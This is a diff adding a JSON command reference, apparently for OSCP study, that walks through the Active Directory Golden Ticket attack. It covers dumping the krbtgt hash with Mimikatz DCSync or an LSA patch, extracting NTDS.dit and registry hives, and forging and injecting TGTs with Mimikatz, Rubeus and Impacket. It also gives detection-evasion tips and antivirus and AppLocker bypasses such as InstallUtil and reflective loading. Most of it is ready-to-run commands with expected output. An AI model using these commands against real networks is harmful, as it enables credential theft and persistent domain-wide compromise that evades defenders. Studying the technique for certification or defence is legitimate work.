@@ -1,0 +1,566 @@
+{
+  "metadata": {
+    "file_purpose": "Active Directory Golden Ticket Attack Commands - Complete reference for creating and using TGT forgery attacks to achieve domain-wide persistence and access",
+    "oscp_relevance": "High-priority persistence technique. Golden Tickets provide domain-wide access by forging TGTs using the krbtgt account hash. Critical for maintaining access after domain compromise. More powerful than Silver Tickets (which target specific services). Commonly tested in OSCP lab environments.",
+    "educational_context": "Golden Tickets leverage the Kerberos authentication protocol by forging Ticket Granting Tickets (TGTs) using the krbtgt account's password hash. Unlike Silver Tickets (forged TGS for specific services), Golden Tickets grant domain-wide access because they're encrypted with the krbtgt secret key. The krbtgt password rarely changes (only on domain functional level upgrades from pre-2008), making this an excellent persistence mechanism.",
+    "prerequisites": [
+      "Domain Admin access OR Domain Controller compromise (to obtain krbtgt hash)",
+      "krbtgt account NTLM hash",
+      "Domain SID (obtain with: whoami /user)",
+      "Valid domain username (post-July 2022 security updates)",
+      "Mimikatz or Rubeus on compromised workstation"
+    ],
+    "related_techniques": [
+      "Silver Ticket (ad-silver-ticket.json)",
+      "DCSync (ad-dcsync.json)",
+      "Overpass the Hash (ad-overpass-the-hash.json)",
+      "Kerberoasting (ad-kerberoasting.json)"
+    ],
+    "attack_chain": [
+      "1. Compromise Domain Admin account OR Domain Controller",
+      "2. Extract krbtgt NTLM hash via DCSync or LSA dump",
+      "3. Obtain Domain SID from any domain user",
+      "4. Create Golden Ticket with krbtgt hash and Domain SID",
+      "5. Inject ticket into memory on compromised workstation",
+      "6. Use ticket for lateral movement (PsExec, WMI, etc.)",
+      "7. Maintain persistent domain-wide access"
+    ],
+    "detection_evasion": [
+      "Use AES256 encryption instead of RC4 (requires AES krbtgt hash)",
+      "Set realistic ticket lifetimes (default 10 years is suspicious)",
+      "Use existing account names (post-July 2022 requirement)",
+      "Avoid excessive ticket renewal",
+      "Use hostnames (Kerberos) instead of IPs (NTLM) for lateral movement"
+    ]
+  },
+  "commands": [
+    {
+      "id": "ad-golden-ticket-dcsync-krbtgt",
+      "name": "Obtain krbtgt Hash via DCSync",
+      "category": "enumeration",
+      "subcategory": "active-directory",
+      "command": "mimikatz # lsadump::dcsync /domain:<DOMAIN_FQDN> /user:krbtgt",
+      "description": "Extract krbtgt account NTLM hash remotely using DCSync attack. Requires Domain Admin or equivalent replication privileges. This is the PRIMARY method for obtaining krbtgt hash without accessing the Domain Controller directly.",
+      "variables": [
+        {
+          "name": "<DOMAIN_FQDN>",
+          "description": "Fully Qualified Domain Name of the Active Directory domain",
+          "example": "corp.com",
+          "required": true
+        }
+      ],
+      "flag_explanations": {
+        "lsadump::dcsync": "Mimikatz module that simulates the behavior of a Domain Controller by requesting account password data via the Directory Replication Service (DRS) Remote Protocol. This allows extraction of password hashes WITHOUT executing code on the Domain Controller itself. Requires DS-Replication-Get-Changes and DS-Replication-Get-Changes-All extended rights (granted to Domain Admins, Enterprise Admins, and Domain Controllers by default).",
+        "/domain": "Target domain's Fully Qualified Domain Name (FQDN). Example: corp.com, internal.local, ad.example.com. CRITICAL: Use the FQDN format, not NetBIOS name. The DCSync protocol requires proper domain specification for replication requests.",
+        "/user:krbtgt": "Target account to extract. The 'krbtgt' (Kerberos Ticket Granting Ticket) account is a special built-in account used by the Key Distribution Center (KDC) service. Its password hash is used to encrypt all TGTs issued by the domain. This account's password is ONLY changed during domain functional level upgrades from pre-Windows Server 2008, making it extremely stable for persistence."
+      },
+      "success_indicators": [
+        "Output contains: 'Domain : <DOMAIN> / S-1-5-21-...'",
+        "Output contains: 'RID  : 000001f6 (502)' (krbtgt RID)",
+        "Output contains: 'User : krbtgt'",
+        "Output contains: 'NTLM : [32-character hex hash]'",
+        "Hash format: 32 hexadecimal characters (example: 1693c6cefafffc7af11ef34d1c788f47)"
+      ],
+      "failure_indicators": [
+        "ERROR kuhl_m_lsadump_dcsync ; GetNCChanges: 0x00002105",
+        "Access is denied",
+        "The attempted operation did not complete because the user does not have the necessary access rights",
+        "The RPC server is unavailable"
+      ],
+      "troubleshooting": {
+        "ERROR 0x00002105 (Access Denied)": "Current user lacks replication privileges. Required extended rights: DS-Replication-Get-Changes and DS-Replication-Get-Changes-All. Solution: Compromise a Domain Admin, Enterprise Admin, or Domain Controller account. Verify group membership with: net user <username> /domain",
+        "RPC server unavailable": "Cannot contact Domain Controller. Solution: Verify DC hostname resolution (nslookup <domain>), ensure network connectivity (ping <dc_fqdn>), check firewall rules (RPC requires ports 135, 445, and dynamic high ports).",
+        "The user name or password is incorrect": "Current session lacks domain authentication. Solution: Ensure you're running from a domain-joined machine or have injected domain credentials (runas /netonly, or pass-the-hash attack).",
+        "No output / blank hash field": "krbtgt account may be disabled (rare). Solution: Verify account status with: net user krbtgt /domain. If disabled, this is an exceptional configuration requiring further investigation."
+      },
+      "prerequisites": [
+        "ad-dcsync-check-privileges"
+      ],
+      "next_steps": [
+        "ad-sid-whoami-extract",
+        "ad-golden-ticket-purge-tickets",
+        "ad-golden-ticket-mimikatz-create"
+      ],
+      "alternatives": [
+        "ad-golden-ticket-lsa-dump-krbtgt"
+      ],
+      "tags": [
+        "ACTIVE_DIRECTORY",
+        "DCSYNC",
+        "GOLDEN_TICKET",
+        "KERBEROS",
+        "MIMIKATZ",
+        "PERSISTENCE",
+        "HASH_EXTRACTION",
+        "OSCP:HIGH",
+        "WINDOWS"
+      ],
+      "oscp_relevance": "high",
+      "notes": "DCSync is the PREFERRED method for obtaining krbtgt hash because it can be performed remotely without logging into the Domain Controller. This reduces detection risk and operational footprint. The attack leverages legitimate AD replication protocols, making it difficult to distinguish from normal DC-to-DC synchronization traffic. Time estimate: 10-30 seconds for hash extraction. Save the NTLM hash immediately - you'll need it for Golden Ticket creation.\n\nMANUAL ALTERNATIVES:\nWithout Mimikatz, you can use Impacket's secretsdump.py: secretsdump.py <DOMAIN>/<USER>:<PASSWORD>@<DC_IP> -just-dc-user krbtgt\n\nOr PowerShell with Invoke-Mimikatz: Invoke-Mimikatz -Command '\"lsadump::dcsync /domain:<DOMAIN> /user:krbtgt\"'\n\nTIME ESTIMATE: 30 seconds - 1 minute (including verification)"
+    },
+    {
+      "id": "ad-golden-ticket-lsa-dump-krbtgt",
+      "name": "Obtain krbtgt Hash via LSA Dump (On DC)",
+      "category": "enumeration",
+      "subcategory": "active-directory",
+      "command": "mimikatz # lsadump::lsa /patch",
+      "description": "Extract krbtgt account NTLM hash directly from Domain Controller's LSA (Local Security Authority) memory. Requires local administrator access ON the Domain Controller. Alternative to DCSync when you have direct DC access.",
+      "variables": [],
+      "flag_explanations": {
+        "lsadump::lsa": "Mimikatz module that dumps the Local Security Authority (LSA) secrets from memory. LSA stores sensitive security information including cached domain credentials, service account passwords, and the krbtgt hash. This method requires running Mimikatz ON the Domain Controller itself with local admin privileges.",
+        "/patch": "Patches LSASS.exe memory to bypass security protections that prevent credential dumping. This temporarily modifies the LSASS process in-memory to disable safeguards. CRITICAL: Use 'privilege::debug' first to obtain SeDebugPrivilege, which is required for LSASS memory access. The /patch flag is necessary on modern Windows Server versions (2012+) due to enhanced LSA protections."
+      },
+      "success_indicators": [
+        "Output contains: 'Privilege '20' OK' (from privilege::debug)",
+        "Output contains: 'Domain : <DOMAIN> / S-1-5-21-...'",
+        "Output contains: 'RID  : 000001f6 (502)'",
+        "Output contains: 'User : krbtgt'",
+        "Output contains: 'NTLM : [32-character hex hash]'",
+        "Multiple account hashes displayed (Administrator, Guest, krbtgt, etc.)"
+      ],
+      "failure_indicators": [
+        "Handle on memory (0x00000000)",
+        "ERROR kuhl_m_lsadump_lsa ; LsaRetrievePrivateData: 0x00000002",
+        "Mimikatz requires Local System privileges",
+        "Access is denied"
+      ],
+      "troubleshooting": {
+        "Handle on memory (0x00000000)": "Failed to access LSASS memory. Solution: Run 'privilege::debug' first to obtain SeDebugPrivilege. If still failing, ensure Mimikatz is running as Administrator (not just elevated - use PsExec -s for SYSTEM context).",
+        "ERROR 0x00000002": "LSA data retrieval failed. Solution: The /patch parameter may have failed to apply. Verify Windows Defender / AV is disabled. On highly restricted systems, try alternative: 'lsadump::lsa /inject' to inject into a new process.",
+        "Mimikatz requires Local System privileges": "Running as Administrator but not SYSTEM. Solution: Use PsExec to launch Mimikatz as SYSTEM: PsExec.exe -s -i cmd.exe, then run Mimikatz from that shell.",
+        "Access is denied": "Insufficient privileges. Solution: Verify you're local admin on the DC: net localgroup Administrators. If not, compromise a DC admin account first."
+      },
+      "prerequisites": [
+        "windows-psexec-system-shell"
+      ],
+      "next_steps": [
+        "ad-sid-whoami-extract",
+        "ad-golden-ticket-purge-tickets",
+        "ad-golden-ticket-mimikatz-create"
+      ],
+      "alternatives": [
+        "ad-golden-ticket-dcsync-krbtgt"
+      ],
+      "tags": [
+        "ACTIVE_DIRECTORY",
+        "LSA_DUMP",
+        "GOLDEN_TICKET",
+        "KERBEROS",
+        "MIMIKATZ",
+        "PERSISTENCE",
+        "HASH_EXTRACTION",
+        "OSCP:MEDIUM",
+        "WINDOWS",
+        "REQUIRES_DC_ACCESS"
+      ],
+      "oscp_relevance": "medium",
+      "notes": "LSA dump requires PHYSICAL (or RDP) access to the Domain Controller, making it less stealthy than DCSync. However, it's useful when: (1) You've already compromised the DC, (2) Replication rights are unavailable, (3) DCSync is being monitored. IMPORTANT: This method dumps ALL domain account hashes, not just krbtgt. Save the output to a file for later analysis. The krbtgt hash is marked with RID 000001f6 (502 in decimal). Time estimate: 10-20 seconds for dump completion.\n\nMANUAL ALTERNATIVES:\nWithout Mimikatz on the DC, you can:\n1. Use Impacket remotely: secretsdump.py <DOMAIN>/<USER>@<DC_IP> -just-dc\n2. Extract NTDS.dit and SYSTEM hive, then parse offline: ntdsutil 'activate instance ntds' 'ifm' 'create full C:\\temp\\ntds' quit quit\n3. Use built-in tools: reg save HKLM\\SYSTEM SystemBkup.hiv && reg save HKLM\\SAM SAMBkup.hiv\n\nTIME ESTIMATE: 30 seconds - 1 minute (including privilege escalation to SYSTEM)"
+    },
+    {
+      "id": "ad-golden-ticket-purge-tickets",
+      "name": "Purge Existing Kerberos Tickets",
+      "category": "post-exploit",
+      "subcategory": "active-directory",
+      "command": "mimikatz # kerberos::purge",
+      "description": "Delete all Kerberos tickets from the current user session. Essential cleanup before injecting a Golden Ticket to avoid conflicts with existing tickets. Ensures the forged ticket will be used for authentication.",
+      "variables": [],
+      "flag_explanations": {
+        "kerberos::purge": "Mimikatz module that removes all Kerberos tickets from the current logon session's ticket cache. Equivalent to 'klist purge' but works even when klist fails. This clears both TGTs (Ticket Granting Tickets) and TGS tickets (service tickets). CRITICAL: Purge tickets BEFORE creating a Golden Ticket to ensure Windows uses the forged ticket instead of cached legitimate tickets. The purge only affects the current session - other logged-in users retain their tickets."
+      },
+      "success_indicators": [
+        "Output: 'Ticket(s) purge for current session is OK'",
+        "Verification with klist shows: 'No credentials cached' or empty ticket list"
+      ],
+      "failure_indicators": [
+        "ERROR kuhl_m_kerberos_purge",
+        "Access is denied",
+        "Unable to purge tickets"
+      ],
+      "troubleshooting": {
+        "Access is denied": "Insufficient privileges for ticket cache manipulation. Solution: This should work for standard users on their own session. If failing, try running Mimikatz as Administrator. Verify you're purging YOUR session, not another user's.",
+        "ERROR kuhl_m_kerberos_purge": "Kerberos subsystem error. Solution: Verify Windows is domain-joined (not workgroup). Check domain connectivity: nltest /dsgetdc:<domain>. If domain unreachable, ticket purge may fail.",
+        "No effect / tickets remain": "Tickets being regenerated immediately. Solution: This is normal if you're actively authenticated to domain resources. Close all SMB connections (net use * /delete) and try again. Alternatively, proceed with Golden Ticket injection - it will override existing tickets."
+      },
+      "prerequisites": [],
+      "next_steps": [
+        "ad-golden-ticket-mimikatz-create",
+        "ad-golden-ticket-verify-klist"
+      ],
+      "alternatives": [
+        "kerberos-klist-purge"
+      ],
+      "tags": [
+        "ACTIVE_DIRECTORY",
+        "KERBEROS",
+        "GOLDEN_TICKET",
+        "MIMIKATZ",
+        "CLEANUP",
+        "TICKET_MANIPULATION",
+        "OSCP:HIGH",
+        "WINDOWS"
+      ],
+      "oscp_relevance": "high",
+      "notes": "Ticket purging is OPTIONAL but highly recommended for clean Golden Ticket injection. If you don't purge, Windows may use cached legitimate tickets instead of your forged Golden Ticket, causing authentication to fail or use the wrong identity. Best practice: Always purge before injecting any forged ticket (Golden or Silver). This operation is reversible - simply re-authenticate to domain resources to generate new legitimate tickets. Time estimate: Instant (<1 second).\n\nMANUAL ALTERNATIVES:\nNative Windows command (requires elevation):\nklist purge\n\nPowerShell alternative:\nInvoke-Mimikatz -Command '\"kerberos::purge\"'\n\nComplete cleanup (close sessions + purge):\nnet use * /delete /y && klist purge\n\nTIME ESTIMATE: < 5 seconds"
+    },
+    {
+      "id": "ad-golden-ticket-mimikatz-create",
+      "name": "Create Golden Ticket with Mimikatz",
+      "category": "post-exploit",
+      "subcategory": "active-directory",
+      "command": "mimikatz # kerberos::golden /user:<USERNAME> /domain:<DOMAIN_FQDN> /sid:<DOMAIN_SID> /krbtgt:<KRBTGT_NTLM> /ptt",
+      "description": "Forge a Kerberos Ticket Granting Ticket (TGT) using the krbtgt account hash and inject it into memory. This creates a domain-administrative ticket granting domain-wide access. The PRIMARY method for Golden Ticket attacks.",
+      "variables": [
+        {
+          "name": "<USERNAME>",
+          "description": "Domain user account to impersonate. MUST be an existing account (post-July 2022 security update). Can be low-privileged account - permissions come from forged group memberships.",
+          "example": "jen",
+          "required": true
+        },
+        {
+          "name": "<DOMAIN_FQDN>",
+          "description": "Fully Qualified Domain Name of the Active Directory domain",
+          "example": "corp.com",
+          "required": true
+        },
+        {
+          "name": "<DOMAIN_SID>",
+          "description": "Domain Security Identifier WITHOUT the user RID. Format: S-1-5-21-XXXXXXXXXX-XXXXXXXXXX-XXXXXXXXXX (exclude the trailing -500, -1001, etc.). Obtain with: whoami /user (remove last segment after final hyphen).",
+          "example": "S-1-5-21-1987370270-658905905-1781884369",
+          "required": true
+        },
+        {
+          "name": "<KRBTGT_NTLM>",
+          "description": "NTLM password hash of the krbtgt account (obtained via DCSync or LSA dump). 32 hexadecimal characters.",
+          "example": "1693c6cefafffc7af11ef34d1c788f47",
+          "required": true
+        }
+      ],
+      "flag_explanations": {
+        "kerberos::golden": "Mimikatz module for forging Kerberos tickets (both TGTs and TGS). When used with /krbtgt parameter, it creates a Golden Ticket (TGT). The forged ticket is encrypted with the krbtgt password hash, making it indistinguishable from legitimate TGTs issued by the KDC. Windows systems trust this ticket because it has valid encryption.",
+        "/user": "Account name to impersonate in the forged ticket. CRITICAL: As of July 2022 Microsoft security updates, this MUST be an existing domain account. Prior to this update, fictional usernames worked. Use a real low-privileged account (e.g., 'jen', 'bob') - the ticket's group memberships grant Domain Admin rights regardless of the real account's privileges. WHY: This provides stealth - using 'Administrator' is obvious, using 'jen' with DA rights is subtle.",
+        "/domain": "Target domain's Fully Qualified Domain Name (FQDN). Example: corp.com, internal.local. MUST match the domain of the krbtgt hash. The forged ticket's realm field will be set to this value. Windows validates that the ticket realm matches the domain during authentication. WHY FQDN: Kerberos uses realm names (FQDNs), not NetBIOS names.",
+        "/sid": "Domain Security Identifier WITHOUT the RID (Relative Identifier). Format: S-1-5-21-XXXXXXXXXX-XXXXXXXXXX-XXXXXXXXXX. CRITICAL: Exclude the user RID (the last segment after the final hyphen). Example: if 'whoami /user' shows 'S-1-5-21-1987370270-658905905-1781884369-1105', use only 'S-1-5-21-1987370270-658905905-1781884369'. WHY: The /user parameter adds the user RID automatically. The /sid parameter is the DOMAIN SID, not a user SID.",
+        "/krbtgt": "NTLM password hash of the krbtgt account (32 hex characters). This is the secret key used to encrypt TGTs. By possessing this hash, we can forge TGTs that the domain controller will trust and decrypt. The KDC has no way to distinguish our forged TGT from a legitimate one because the encryption is valid. CRITICAL: This is the most sensitive credential in Active Directory - protect it carefully.",
+        "/ptt": "Pass The Ticket - automatically inject the forged ticket into the current session's Kerberos ticket cache after creation. Without this flag, the ticket is only created but not used. WITH /ptt: Ticket is immediately usable for authentication. Alternative: Use /ticket parameter to save to file, then 'kerberos::ptt <file>' to inject later. WHY /ptt: Streamlines the attack - create and use in one command.",
+        "Default: /id:500": "Mimikatz automatically sets the forged user's RID to 500 (built-in Administrator). This doesn't change the /user value shown in the ticket, but affects internal ticket structure. WHY 500: Ensures maximum compatibility and privileges.",
+        "Default: /groups:513,512,520,518,519": "Mimikatz automatically adds the user to the most privileged groups: 512 (Domain Admins), 513 (Domain Users), 518 (Schema Admins), 519 (Enterprise Admins), 520 (Group Policy Creator Owners). These group memberships grant domain-wide administrative access. The domain controller trusts these group claims because the ticket encryption is valid."
+      },
+      "success_indicators": [
+        "Output: 'User      : <username>'",
+        "Output: 'Domain    : <domain> (NETBIOS_NAME)'",
+        "Output: 'SID       : S-1-5-21-...'",
+        "Output: 'User Id   : 500' (default RID)",
+        "Output: 'Groups Id : *513 512 520 518 519' (privileged groups)",
+        "Output: 'ServiceKey: [hash] - rc4_hmac_nt'",
+        "Output: 'Golden ticket for '<user> @ <domain>' successfully submitted for current session'",
+        "Ticket visible in: klist (shows Client: <user> @ <domain>, Server: krbtgt/<domain> @ <domain>)"
+      ],
+      "failure_indicators": [
+        "ERROR kuhl_m_kerberos_golden",
+        "Data length error",
+        "SID is too long",
+        "KRB_AP_ERR_MODIFIED"
+      ],
+      "troubleshooting": {
+        "SID is too long": "You included the user RID in the /sid parameter. Solution: Remove the last segment from the SID. Example: Change 'S-1-5-21-XXX-XXX-XXX-1105' to 'S-1-5-21-XXX-XXX-XXX'. The /sid parameter requires DOMAIN SID only, not user SID.",
+        "Data length error": "Incorrect hash format for /krbtgt parameter. Solution: Verify the hash is exactly 32 hexadecimal characters (0-9, a-f). Remove any spaces, colons, or prefixes. Example: '1693c6cefafffc7af11ef34d1c788f47' (correct) vs '16:93:c6:ce...' (incorrect).",
+        "KRB_AP_ERR_MODIFIED (when using ticket)": "Incorrect krbtgt hash or Domain SID. Solution: Re-extract krbtgt hash with DCSync. Verify Domain SID with: whoami /user (from any domain user). Common mistake: Using computer SID instead of domain SID. Ensure you're using hash from the correct domain.",
+        "User does not exist (post-July 2022)": "Specified /user account doesn't exist in Active Directory. Solution: Use an existing account name. Query accounts with: net user /domain. Use common accounts like service accounts or known user accounts from reconnaissance.",
+        "Ticket created but authentication fails": "Using IP address instead of hostname for target. Solution: Golden Tickets use Kerberos authentication which requires FQDNs. Use: PsExec.exe \\\\DC1 cmd.exe (correct) instead of PsExec.exe \\\\192.168.50.70 cmd.exe (forces NTLM). Verify DNS resolution: nslookup <target_fqdn>."
+      },
+      "prerequisites": [
+        "ad-golden-ticket-dcsync-krbtgt",
+        "ad-sid-whoami-extract",
+        "ad-golden-ticket-purge-tickets"
+      ],
+      "next_steps": [
+        "ad-golden-ticket-verify-klist",
+        "ad-golden-ticket-psexec-use",
+        "windows-net-use-smb-connect"
+      ],
+      "alternatives": [
+        "ad-golden-ticket-rubeus-create"
+      ],
+      "tags": [
+        "ACTIVE_DIRECTORY",
+        "GOLDEN_TICKET",
+        "KERBEROS",
+        "MIMIKATZ",
+        "PERSISTENCE",
+        "PRIVILEGE_ESCALATION",
+        "TICKET_FORGERY",
+        "DOMAIN_DOMINANCE",
+        "OSCP:HIGH",
+        "WINDOWS"
+      ],
+      "oscp_relevance": "high",
+      "notes": "Golden Ticket is one of the most powerful Active Directory persistence techniques. Key advantages: (1) Domain-wide access to all resources, (2) krbtgt password rarely changes (only on domain functional level upgrades), (3) Works from non-domain-joined machines, (4) No administrative privileges needed for ticket creation (only for obtaining krbtgt hash initially). EXAM TIP: Always use hostnames (not IPs) when authenticating with Golden Tickets - Kerberos requires FQDNs. Default ticket lifetime is 10 years - extremely suspicious for detection. Consider customizing with /startoffset, /endin, /renewmax flags for realistic lifetimes. Time estimate: 5-10 seconds for ticket creation and injection.\n\nMANUAL ALTERNATIVES:\nRubeus alternative (C# implementation):\nRubeus.exe golden /user:<USERNAME> /domain:<DOMAIN> /sid:<DOMAIN_SID> /krbtgt:<HASH> /ptt\n\nImpacket alternative (Linux):\nticketer.py -nthash <KRBTGT_HASH> -domain-sid <DOMAIN_SID> -domain <DOMAIN> <USERNAME>\nexport KRB5CCNAME=<USERNAME>.ccache\npsexec.py <DOMAIN>/<USERNAME>@<TARGET> -k -no-pass\n\nPowerShell (Invoke-Mimikatz):\nInvoke-Mimikatz -Command '\"kerberos::golden /user:<USER> /domain:<DOMAIN> /sid:<SID> /krbtgt:<HASH> /ptt\"'\n\nTIME ESTIMATE: 10-15 seconds (creation + injection)"
+    },
+    {
+      "id": "ad-golden-ticket-rubeus-create",
+      "name": "Create Golden Ticket with Rubeus (Alternative)",
+      "category": "post-exploit",
+      "subcategory": "active-directory",
+      "command": "Rubeus.exe golden /user:<USERNAME> /domain:<DOMAIN_FQDN> /sid:<DOMAIN_SID> /rc4:<KRBTGT_NTLM> /ptt",
+      "description": "Forge a Kerberos TGT using Rubeus (C# alternative to Mimikatz). Provides AES encryption option for better evasion. Useful when Mimikatz is detected by AV/EDR.",
+      "variables": [
+        {
+          "name": "<USERNAME>",
+          "description": "Domain user account to impersonate (must exist post-July 2022)",
+          "example": "jen",
+          "required": true
+        },
+        {
+          "name": "<DOMAIN_FQDN>",
+          "description": "Fully Qualified Domain Name of the Active Directory domain",
+          "example": "corp.com",
+          "required": true
+        },
+        {
+          "name": "<DOMAIN_SID>",
+          "description": "Domain Security Identifier WITHOUT user RID",
+          "example": "S-1-5-21-1987370270-658905905-1781884369",
+          "required": true
+        },
+        {
+          "name": "<KRBTGT_NTLM>",
+          "description": "NTLM password hash of krbtgt account (32 hex characters)",
+          "example": "1693c6cefafffc7af11ef34d1c788f47",
+          "required": true
+        }
+      ],
+      "flag_explanations": {
+        "golden": "Rubeus command for Golden Ticket creation. Rubeus is a C# toolset for Kerberos abuse, compiled as a .NET assembly. Advantage over Mimikatz: Pure C#, doesn't touch LSASS, better AV/EDR evasion, can be loaded reflectively via PowerShell or Cobalt Strike's execute-assembly.",
+        "/user": "Account name to impersonate. Same requirements as Mimikatz - must be existing account (post-July 2022). Rubeus will forge the PAC (Privilege Attribute Certificate) with Domain Admin group memberships automatically.",
+        "/domain": "Target domain FQDN. Rubeus uses this to construct the Kerberos realm and SPN (Service Principal Name) for the krbtgt service.",
+        "/sid": "Domain SID without user RID. Same format as Mimikatz. Rubeus uses this to construct group SIDs (e.g., S-1-5-21-XXX-512 for Domain Admins).",
+        "/rc4": "NTLM hash of krbtgt account. In Rubeus, RC4 encryption is specified with /rc4 flag (unlike Mimikatz which uses /krbtgt). WHY RC4: Fastest encryption, widest compatibility. Tradeoff: RC4 is deprecated and monitored by modern SOCs. For evasion, use /aes256 instead (requires AES krbtgt key).",
+        "/ptt": "Pass The Ticket - inject into current session after creation. Identical behavior to Mimikatz. Without this flag, ticket is saved to .kirbi file for later use.",
+        "Alternative: /aes256:<AES_KEY>": "Use AES256 encryption instead of RC4. Requires AES256 krbtgt key (obtain with: lsadump::dcsync /domain:<DOMAIN> /user:krbtgt). BENEFIT: AES256 is the modern encryption standard, less suspicious than RC4. Many SOC rules alert on RC4 ticket usage. EXAM NOTE: AES keys may not be available in older lab environments."
+      },
+      "success_indicators": [
+        "Output: '[*] Action: Build TGT'",
+        "Output: '[*] Building PAC'",
+        "Output: '[*] Domain         : <DOMAIN>'",
+        "Output: '[*] SID            : S-1-5-21-...'",
+        "Output: '[*] Username       : <username>'",
+        "Output: '[*] Groups         : 512,513,518,519,520' (privileged groups)",
+        "Output: '[+] Ticket successfully imported!' (if /ptt used)",
+        "Verification with: Rubeus.exe klist (shows injected TGT)"
+      ],
+      "failure_indicators": [
+        "[X] Error: Invalid domain SID",
+        "[X] Error: Invalid hash format",
+        "[X] Unable to import ticket",
+        "User is not a member of the domain"
+      ],
+      "troubleshooting": {
+        "Invalid domain SID": "Included user RID in /sid parameter. Solution: Remove last segment from SID (same as Mimikatz troubleshooting).",
+        "Invalid hash format": "Incorrect hash length or characters. Solution: Ensure exactly 32 hex characters for RC4, or 64 hex characters for AES256.",
+        "Unable to import ticket": "Insufficient privileges for ticket cache manipulation. Solution: Run Rubeus as Administrator. Alternatively, save ticket to file (/outfile:ticket.kirbi) and inject later when privileges are available.",
+        "Rubeus.exe not recognized": "Rubeus not in PATH or current directory. Solution: Download from GitHub (GhostPack/Rubeus), compile with Visual Studio, or use pre-compiled release. Transfer to target with file transfer techniques.",
+        "This program is blocked by group policy": "Application whitelisting / AppLocker blocking Rubeus.exe. Solution: Try InstallUtil.exe bypass (InstallUtil /logfile= /LogToConsole=false /U Rubeus.exe), or use PowerShell reflective loading: $data = [IO.File]::ReadAllBytes('Rubeus.exe'); [Reflection.Assembly]::Load($data)"
+      },
+      "prerequisites": [
+        "ad-golden-ticket-dcsync-krbtgt",
+        "ad-sid-whoami-extract"
+      ],
+      "next_steps": [
+        "ad-golden-ticket-verify-klist",
+        "ad-golden-ticket-psexec-use"
+      ],
+      "alternatives": [
+        "ad-golden-ticket-mimikatz-create"
+      ],
+      "tags": [
+        "ACTIVE_DIRECTORY",
+        "GOLDEN_TICKET",
+        "KERBEROS",
+        "RUBEUS",
+        "PERSISTENCE",
+        "PRIVILEGE_ESCALATION",
+        "TICKET_FORGERY",
+        "AV_EVASION",
+        "OSCP:MEDIUM",
+        "WINDOWS"
+      ],
+      "oscp_relevance": "medium",
+      "notes": "Rubeus is a modern alternative to Mimikatz with better AV/EDR evasion. Advantages: (1) Pure C#, doesn't interact with LSASS directly, (2) Can use AES256 encryption for stealthier tickets, (3) Compiles to .NET assembly (execute-assembly in Cobalt Strike), (4) Active development and updates. Disadvantages: (1) Requires .NET Framework on target, (2) Less feature-complete than Mimikatz for other attacks. EXAM TIP: If Mimikatz is blocked by AV, try Rubeus. For maximum stealth, use /aes256 if you can obtain the AES krbtgt key. Time estimate: 10-20 seconds.\n\nMANUAL ALTERNATIVES:\nAES256 encryption (stealthier):\nRubeus.exe golden /user:<USER> /domain:<DOMAIN> /sid:<SID> /aes256:<AES_KEY> /ptt\n\nSave to file instead of injecting:\nRubeus.exe golden /user:<USER> /domain:<DOMAIN> /sid:<SID> /rc4:<HASH> /outfile:ticket.kirbi\nRubeus.exe ptt /ticket:ticket.kirbi\n\nReflective loading (bypass AV):\n[System.Reflection.Assembly]::Load([IO.File]::ReadAllBytes('Rubeus.exe'))\n[Rubeus.Program]::Main('golden /user:<USER> /domain:<DOMAIN> /sid:<SID> /rc4:<HASH> /ptt'.Split())\n\nTIME ESTIMATE: 15-30 seconds (including AV bypass if needed)"
+    },
+    {
+      "id": "ad-golden-ticket-verify-klist",
+      "name": "Verify Golden Ticket with klist",
+      "category": "enumeration",
+      "subcategory": "active-directory",
+      "command": "klist",
+      "description": "Display all Kerberos tickets in the current user session to verify Golden Ticket injection. Shows ticket details including client, server, encryption type, and expiration.",
+      "variables": [],
+      "flag_explanations": {
+        "klist": "Native Windows command (part of Windows since Server 2008) that displays cached Kerberos tickets for the current logon session. Shows TGTs (Ticket Granting Tickets) and TGS tickets (service tickets). NO FLAGS REQUIRED for basic listing. Useful for verifying ticket injection success, checking ticket lifetimes, and troubleshooting Kerberos authentication issues.",
+        "Optional: klist tickets": "Same as 'klist' without arguments - displays tickets for current session.",
+        "Optional: klist purge": "Deletes all tickets from current session (equivalent to mimikatz kerberos::purge).",
+        "Optional: klist sessions": "Lists all logon sessions on the system (requires admin privileges). Useful for seeing all users' tickets."
+      },
+      "success_indicators": [
+        "Output contains: '#0>     Client: <username> @ <DOMAIN>'",
+        "Output contains: '        Server: krbtgt/<domain> @ <DOMAIN>' (indicates TGT)",
+        "Output contains: '        KerbTicket Encryption Type: RC4-HMAC-NT' (or AES256-CTS-HMAC-SHA1-96)",
+        "Output contains: '        Ticket Flags 0x40e10000' (forwardable, renewable, initial, pre_authent)",
+        "Start Time and End Time show valid dates (End Time far in future for Golden Ticket)",
+        "Renew Time shows date far in future (default: 10 years for Golden Ticket)"
+      ],
+      "failure_indicators": [
+        "Current LogonId is 0:0x0",
+        "No credentials cached",
+        "Cached Tickets: (0)",
+        "klist failed with 0x...: The system cannot find the file specified"
+      ],
+      "troubleshooting": {
+        "No credentials cached": "No tickets present. Solution: Golden Ticket injection failed or was purged. Re-run 'kerberos::golden /ptt' with correct parameters. Verify Mimikatz didn't show errors during injection.",
+        "Current LogonId is 0:0x0": "Not in a valid logon session. Solution: Ensure you're running in an interactive user session (not SYSTEM context). Open a new command prompt with: mimikatz # misc::cmd after ticket injection.",
+        "Server: krbtgt/<domain> missing": "Only service tickets (TGS) shown, no TGT. Solution: A Golden Ticket IS a TGT, so it should show 'Server: krbtgt/<domain>'. If missing, ticket injection failed. Check ticket creation output for errors.",
+        "Encryption Type: NULL": "Ticket is corrupted or invalid. Solution: Purge tickets (klist purge) and recreate Golden Ticket with correct krbtgt hash and domain SID.",
+        "Ticket expiration shows already expired": "System clock is incorrect, or ticket was created with past dates. Solution: Verify system time (time /t), sync with DC if needed (w32tm /resync). Recreate ticket without custom time parameters."
+      },
+      "prerequisites": [
+        "ad-golden-ticket-mimikatz-create"
+      ],
+      "next_steps": [
+        "ad-golden-ticket-psexec-use",
+        "windows-net-use-smb-connect"
+      ],
+      "alternatives": [
+        "rubeus-klist-display"
+      ],
+      "tags": [
+        "ACTIVE_DIRECTORY",
+        "KERBEROS",
+        "GOLDEN_TICKET",
+        "VERIFICATION",
+        "TICKET_ENUMERATION",
+        "OSCP:HIGH",
+        "WINDOWS"
+      ],
+      "oscp_relevance": "high",
